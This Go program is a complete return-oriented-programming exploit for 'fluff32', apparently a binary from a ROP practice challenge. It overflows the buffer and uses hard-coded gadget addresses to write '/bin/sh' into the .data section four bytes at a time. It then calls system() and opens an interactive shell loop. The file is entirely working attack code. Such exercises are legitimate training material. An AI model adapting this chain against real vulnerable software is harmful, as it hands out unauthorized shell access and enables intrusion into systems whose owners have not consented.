package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"time"
)

// .data section
// Location: 0x0804a028
var dataSection = "\x28\xa0\x04\x08"
var dataSectionAdd4 = "\x2c\xa0\x04\x08"

// pop ebx; ret;
// Location: 0x08048716
var popEBX = "\x16\x87\x04\x08"

// xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
// Location: 0x08048671
var xorEDXEDX = "\x71\x86\x04\x08"

// xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
// Location: 0x0804867b
var xorEDXEBX = "\x7b\x86\x04\x08"

// xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret
// Location: 0x08048689
var xchgEDXECX = "\x89\x86\x04\x08"

// mov dword [ecx], edx; pop ebp; pop ebx; xor byte [ecx], bl; ret;
// Location: 0x08048693
var movPtrECXEDX = "\x93\x86\x04\x08"

// system()
// Location: 0x08048430
var system = "\x30\x84\x04\x08"

// 4 byte padding for pop functions
var padding = "\x00\x00\x00\x00"

func loadEDX(bytesToLoad string) (ropChain string) {
	ropChain = xorEDXEDX
	ropChain += padding
	ropChain += popEBX
	ropChain += bytesToLoad
	ropChain += xorEDXEBX
	ropChain += padding
	return
}

func loadECX(bytesToLoad string) (ropChain string) {
	ropChain = loadEDX(bytesToLoad)
	ropChain += xchgEDXECX
	ropChain += padding
	return
}

func writeECXPtr() (ropChain string) {
	ropChain = movPtrECXEDX
	ropChain += padding
	ropChain += padding
	return
}

func main() {
	binary := "./fluff32"
	cmd := exec.Command(binary)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatal(err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal(err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Fatal(err)
	}
	if err = cmd.Start(); err != nil {
		log.Fatal(err)
	}

	// Read the initial output
	output := bufio.NewReader(stdout)
	_, err = output.ReadBytes('>')
	if err != nil {
		log.Fatal(err)
	}

	// Copy output to the terminal
	go io.Copy(os.Stdout, stdout)
	go io.Copy(os.Stderr, stderr)

	// Create ROP chain
	var ropChain string
	for i := 0; i < 44; i++ {
		ropChain += "A"
	}
	// Load "/bin/sh" into .data
	// Due to only being able to load 4 bytes at a time
	// Load "/bin"
	ropChain += loadECX(dataSection)
	ropChain += loadEDX("/bin")
	ropChain += writeECXPtr()
	// Load "//sh"
	ropChain += loadECX(dataSectionAdd4)
	ropChain += loadEDX("//sh")
	ropChain += writeECXPtr()

	// Call system()
	ropChain += system
	ropChain += padding
	ropChain += dataSection
	ropChain += "\n"
	stdin.Write([]byte(ropChain))

	// Interact with shell
	for {
		input := bufio.NewReader(os.Stdin)
		fmt.Printf("$ ")
		shellCommand, _, _ := input.ReadLine()
		shellCommand = append(shellCommand, '\n')
		stdin.Write([]byte(shellCommand))
		time.Sleep(time.Millisecond * 6)
	}
}
